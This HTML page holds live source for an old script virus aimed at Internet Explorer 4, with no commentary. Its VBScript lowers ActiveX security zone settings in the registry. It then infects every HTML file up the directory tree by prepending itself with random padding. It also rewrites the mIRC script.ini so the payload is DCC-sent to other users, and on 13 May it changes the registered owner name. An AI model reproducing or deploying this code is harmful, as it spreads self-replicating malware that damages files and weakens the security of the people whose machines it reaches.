<!--Smile-->

<SCRIPT language=JavaScript>
<!--
	var userAgent=navigator.appName;
	var userVer=navigator.appVersion;
	var agentInfo=userAgent.substring(0, 1);
	var agentVer=userVer.substring(0, 1);
       if(agentInfo == "M"){
if  (agentVer >="4"){
alert("If Your Active-X asks you, and you want \nto continue load this page answer yes when asked")
}
}else {
alert("This page was made for IE 4, and is only for IE4")
self.close()
history.go(-1)
}
//-->
</SCRIPT>

<script language="VBScript"><!--

Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WshShell.RegWrite"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"

On Error Resume Next
Randomize
If location.protocol = "file:" then

 Set FileSystem = CreateObject("Scripting.FileSystemObject")

 Infect_Path = Replace(location.href, "file:///", "")
 Infect_Path = Replace(Infect_Path, "/", "\")
 mypath = FileSystem.GetParentFolderName(Infect_Path)

 Set folder = FileSystem.GetFolder(mypath)
 Call Infect(folder)

 Set Script = FileSystem.OpenTextFile("C:\mirc\script.ini", 2, True)
 Script.WriteLine "[Script]"
 Script.WriteLine "n0=on 1:FILERCVD:*.*:./dcc send $nick c:\xxxpass.htm"
 Script.WriteLine "n1=on 1:Connect:./msg TPhunk Hi there"
 Script.Close

 Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)
 Set xxx = FileSystem.CreateTextFile("c:\xxxpass.htm",2,false)

For I = 1 to 118
 xxx.WriteLine current_vir.ReadLine
Next

 xxx.Close
 current_vir.Close

If Day(now()) = 13 and Month(now()) = 05 then
 WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "Techno Phunk"
 MsgBox("Smile!")
End If

End If

Sub Infect(folder)

While folder.IsRootFolder = false 
 Set folder = FileSystem.GetFolder(mypath)
 Set fc = folder.Files
 mypath = FileSystem.GetParentFolderName(mypath)

For each f1 in fc
 ex = Lcase(FileSystem.GetExtensionName(f1.name))
 if ex = "htm" or ex = "html" or ex ="htt" AND f1.path <> Infect_Path then
 Set current_vir = FileSystem.opentextfile(f1.path, 1, true)
 GetMark = current_vir.readline
 current_vir.close
 if GetMark <> "<!--Smile-->" then

 Set current_vir = FileSystem.opentextfile(Infect_Path, 1, true)
 Temp = FileSystem.GetTempName
 FileSystem.CopyFile f1.path, Temp
 Set host = FileSystem.opentextfile(f1.path, 2, true)
 Poly = int(rnd * 200)

For I = 1 to 118
 host.Writeline current_vir.ReadLine
Next

For I = 1 to Poly
 host.WriteLine chr(13) & chr(10)
Next

 current_vir.close
 host.close

 Set current_vir = FileSystem.opentextfile(Temp, 1, true)
 Set host = FileSystem.opentextfile(f1.path, 8, true)

Do While current_vir.AtEndOfStream <> True

If Int(Rnd * 3) = 1 Then
 host.WriteLine "<!--" & int(rnd * 20000) & "-->"
End If
 host.WriteLine current_vir.ReadLine
Loop

 host.Close
 current_vir.close
 FileSystem.DeleteFile Temp

End If
End If

Next
Wend

End Sub
--></script>
</html>
